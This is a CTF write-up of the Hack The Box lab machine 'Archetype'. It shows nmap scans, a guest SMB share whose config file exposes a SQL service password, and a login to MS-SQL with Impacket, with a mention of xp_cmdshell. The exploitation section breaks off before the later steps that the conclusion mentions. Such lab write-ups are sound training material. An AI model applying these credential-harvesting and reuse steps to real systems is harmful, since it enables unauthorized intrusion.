one of the starting point CTF's from HTB *always a great learning opportunity*

# Enumeration

## Nmap
A basic nmap scan to see what were dealing with:
```bash
$ nmap 10.129.88.67
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 16:55 CEST
Nmap scan report for 10.129.88.67
Host is up (0.029s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
```

seems to be **MS-SQL** and a **SMB share** let's dig a bit deeper
```bash
$ nmap -sC -sV 10.129.88.67
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 17:06 CEST
Nmap scan report for 10.129.88.67
Host is up (0.026s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.88.67:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.88.67:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-24T14:49:12
|_Not valid after:  2055-05-24T14:49:12
|_ssl-date: 2025-05-24T15:06:59+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-24T08:06:54-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-24T15:06:50
|_  start_date: N/A
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s
```

## SMB
so in the Nmap output we can see that the SMB allows for guest access so let's see what we can find in there
```bash
$ smbclient -L 10.129.88.67
Password for [WORKGROUP\janosch]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

backups looks the most interesting let's have a look at that
```bash
$ smbclient //10.129.88.67/backups
Password for [WORKGROUP\janosch]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 13:20:57 2020
  ..                                  D        0  Mon Jan 20 13:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 13:23:02 2020
```

**Contents:**
```json
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

so this **SMB share** just uncovered some passwords for what seems to be the **MS-SQL** server. 

# Exploitation
Let's try to logon to the MS-SQL server with the credentials we just found. For this I'm gonna use `mssqlclient.py` from the Impacket GitHub repo.

```bash
$ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.88.67 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
..Snip..
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

we can use the `xp_cmdshell` command to run cmd or powershell commands



# Conclusion
so this was my first real windows CTF and I got stuck a lot at the windows parts especially trying to do Privilege escalation on windows was a pain in the Ass but I could do A lot with the SMB which saved my ass a bit.

**What I learned:**
- You can do A lot of exploitation with MS-SQL
- File transfers are really different on Windows
- How to run scripts in windows terminals
- Always check out SMB shares with `smbclient`